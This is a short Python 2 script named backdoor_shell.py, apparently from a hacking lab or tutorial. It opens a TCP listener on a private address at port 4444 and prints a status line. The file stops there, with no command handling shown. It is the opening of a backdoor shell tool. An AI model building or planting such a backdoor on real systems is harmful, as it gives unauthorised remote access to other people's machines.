#backdoor_shell.py
import socket 
import sys
host = "192.168.244.1"
port = 4444
server = socket.socket( socket.AF_INET, socket.SOCK_STREAM ) 
server.bind( ( host, port ) )
server.listen( 5 )
print "[*] Server bound to %s:%d" % ( host , port ) 
